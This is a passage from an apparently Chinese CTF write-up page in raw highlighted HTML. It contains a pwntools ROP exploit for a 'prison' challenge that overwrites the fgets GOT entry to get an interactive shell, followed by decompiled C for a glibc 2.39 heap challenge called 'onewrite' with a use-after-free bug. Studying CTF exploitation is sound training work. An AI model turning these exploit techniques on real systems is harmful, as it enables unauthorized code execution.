style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">400668</span><br><span style="color:#393A34">add_bl_dh </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4005cf</span><br><span style="color:#393A34">pop_rbp_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">400608</span><br><span style="color:#393A34">xor_rbx </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">400783</span><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">400782</span><br><span style="color:#393A34">fgets_got </span><span style="color:#999999">=</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">got</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">fgets</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">fgets_plt </span><span style="color:#999999">=</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">plt</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">fgets</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">offset </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">6c8a3</span><br><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">fgets_got </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">3d</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">add_bl_dh</span><span style="color:#999999">,</span><span style="color:#393A34"> magic</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 3</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">magic</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> fgets_got </span><span style="color:#AB5959">-</span><span style="color:#2F798A"> 8</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rbp_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">6010b8</span><span style="color:#999999">,</span><span style="color:#393A34"> fgets_plt</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">offset</span><span style="color:#999999">,</span><span style="color:#393A34"> fgets_got </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">3d</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> magic</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rbp_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">6011b8</span><span style="color:#999999">,</span><span style="color:#393A34"> fgets_plt</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./prison_patched</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">""</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    b *0x400718</span><br><span style="color:#C98A7D">    b *0x400782</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#758575DD"># 0x0000000000400668 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br><span style="color:#758575DD"># 0x00000000004005cf : add bl, dh ; ret</span><br><span style="color:#758575DD"># 0x0000000000400608 : pop rbp ; ret</span><br><span style="color:#758575DD"># 0x0000000000400782 : pop rdi ; xor rbx, rbx ; ret</span><br><span style="color:#758575DD"># 0x0000000000400783 : xor rbx, rbx ; ret</span><br><br><br><span style="color:#DBD7CAEE">magic </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">400668</span><br><span style="color:#DBD7CAEE">add_bl_dh </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4005cf</span><br><span style="color:#DBD7CAEE">pop_rbp_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">400608</span><br><span style="color:#DBD7CAEE">xor_rbx </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">400783</span><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">400782</span><br><span style="color:#DBD7CAEE">fgets_got </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">got</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">fgets</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">fgets_plt </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">plt</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">fgets</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">offset </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">6c8a3</span><br><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">fgets_got </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">3d</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">add_bl_dh</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> magic</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 3</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">magic</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> fgets_got </span><span style="color:#CB7676">-</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rbp_ret</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">6010b8</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> fgets_plt</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">offset</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> fgets_got </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">3d</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> magic</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> pop_rbp_ret</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">6011b8</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> fgets_plt</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>:P</p>
<p>这题还能打别的 magic gadget 和 ret2dlresolve，后者板子不会打，学一下再来。</p>
<h2 id="onewrite" class="scroll-target"><a href="#onewrite"><code class="hash inline-code">#</code>onewrite</a></h2>
<p>2.39 菜单堆，逻辑比较清晰，给了 4 个功能：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#AB5959">ssize_t</span><span style="color:#59873A"> alloc_chunk</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#AB5959"> int</span><span style="color:#393A34"> v1</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+8h] [rbp-8h]</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#AB5959"> int</span><span style="color:#393A34"> size</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+Ch] [rbp-4h]</span><br><br><span style="color:#59873A">  my_print</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">idx: </span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">  v1 </span><span style="color:#999999">=</span><span style="color:#59873A"> get_int</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> v1 </span><span style="color:#AB5959">></span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">63</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#59873A">    _exit</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  my_print</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">size: </span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">  size </span><span style="color:#999999">=</span><span style="color:#59873A"> get_int</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> size </span><span style="color:#AB5959">></span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">5FF</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#59873A">    _exit</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#B07D48">  chunks</span><span style="color:#1e754f">[</span><span style="color:#393A34">v1</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#59873A"> malloc</span><span style="color:#1e754f">(</span><span style="color:#393A34">size</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  my_print</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">done!</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#59873A"> my_print</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">...what? did you think you would get a write?</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">void</span><span style="color:#59873A"> free_chunk</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#AB5959"> int</span><span style="color:#393A34"> v0</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+Ch] [rbp-4h]</span><br><br><span style="color:#59873A">  my_print</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">idx: </span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">  v0 </span><span style="color:#999999">=</span><span style="color:#59873A"> get_int</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34"> v0 </span><span style="color:#AB5959">></span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">63</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#59873A">    _exit</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  free</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">void</span><span style="color:#AB5959"> *</span><span style="color:#a65e2b">)</span><span style="color:#B07D48">chunks</span><span style="color:#a65e2b">[</span><span style="color:#393A34">v0</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">ssize_t</span><span style="color:#59873A"> write_chunk</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#59873A">  my_print</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">data: </span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#59873A"> read</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#393A34"> the_chunk</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">5F8</span><span style="color:#AB5959">uLL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">ssize_t</span><span style="color:#59873A"> read_chunk</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#1E754F">  return</span><span style="color:#59873A"> write</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#393A34"> the_chunk</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">5F8</span><span style="color:#AB5959">uLL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#AB5959">int</span><span style="color:#393A34"> __fastcall __noreturn </span><span style="color:#59873A">main</span><span style="color:#2993a3">(</span><span style="color:#AB5959">int</span><span style="color:#B07D48"> argc</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> **</span><span style="color:#B07D48">argv</span><span style="color:#999999">,</span><span style="color:#AB5959"> const</span><span style="color:#AB5959"> char</span><span style="color:#AB5959"> **</span><span style="color:#B07D48">envp</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#AB5959">  int</span><span style="color:#393A34"> v3</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // eax</span><br><br><span style="color:#393A34">  the_chunk </span><span style="color:#999999">=</span><span style="color:#59873A"> malloc</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">5F8</span><span style="color:#AB5959">uLL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  free</span><span style="color:#1e754f">(</span><span style="color:#393A34">the_chunk</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  while</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#2F798A"> 1</span><span style="color:#999999"> </span><span style="color:#1e754f">)</span><br><span style="color:#999999">  </span><span style="color:#1e754f">{</span><br><span style="color:#1E754F">    while</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#2F798A"> 1</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">{</span><br><span style="color:#393A34">      v3 </span><span style="color:#999999">=</span><span style="color:#59873A"> prompt</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      if</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34"> v3 </span><span style="color:#AB5959">!=</span><span style="color:#2F798A"> 4</span><span style="color:#999999"> </span><span style="color:#a13865">)</span><br><span style="color:#1E754F">        break</span><span style="color:#999999">;</span><br><span style="color:#59873A">      read_chunk</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">}</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> v3 </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 4</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#1E754F">      break</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    switch</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#393A34"> v3 </span><span style="color:#a65e2b">)</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">{</span><br><span style="color:#1E754F">      case</span><span style="color:#2F798A"> 3</span><span style="color:#999999">:</span><br><span style="color:#59873A">        write_chunk</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        break</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      case</span><span style="color:#2F798A"> 1</span><span style="color:#999999">:</span><br><span style="color:#59873A">        alloc_chunk</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        break</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      case</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><br><span style="color:#59873A">        free_chunk</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">        break</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      default</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        goto</span><span style="color:#393A34"> LABEL_12</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">}</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#393A34">LABEL_12:</span><br><span style="color:#59873A">  _exit</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#CB7676">ssize_t</span><span style="color:#80A665"> alloc_chunk</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  unsigned</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> v1</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+8h] [rbp-8h]</span><br><span style="color:#CB7676">  unsigned</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> size</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+Ch] [rbp-4h]</span><br><br><span style="color:#80A665">  my_print</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">idx: </span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  v1 </span><span style="color:#666666">=</span><span style="color:#80A665"> get_int</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE"> v1 </span><span style="color:#CB7676">></span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">63</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#80A665">    _exit</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  my_print</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">size: </span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  size </span><span style="color:#666666">=</span><span style="color:#80A665"> get_int</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE"> size </span><span style="color:#CB7676">></span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">5FF</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#80A665">    _exit</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">  chunks</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">v1</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#80A665"> malloc</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">size</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  my_print</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">done!</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#80A665"> my_print</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">...what? did you think you would get a write?</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">void</span><span style="color:#80A665"> free_chunk</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  unsigned</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> v0</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+Ch] [rbp-4h]</span><br><br><span style="color:#80A665">  my_print</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">idx: </span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  v0 </span><span style="color:#666666">=</span><span style="color:#80A665"> get_int</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE"> v0 </span><span style="color:#CB7676">></span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">63</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#80A665">    _exit</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  free</span><span style="color:#4d9375">(</span><span style="color:#d4976c">(</span><span style="color:#CB7676">void</span><span style="color:#CB7676"> *</span><span style="color:#d4976c">)</span><span style="color:#BD976A">chunks</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">v0</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">ssize_t</span><span style="color:#80A665"> write_chunk</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#80A665">  my_print</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">data: </span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#80A665"> read</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> the_chunk</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">5F8</span><span style="color:#CB7676">uLL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">ssize_t</span><span style="color:#80A665"> read_chunk</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#4D9375">  return</span><span style="color:#80A665"> write</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> the_chunk</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">5F8</span><span style="color:#CB7676">uLL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#CB7676">int</span><span 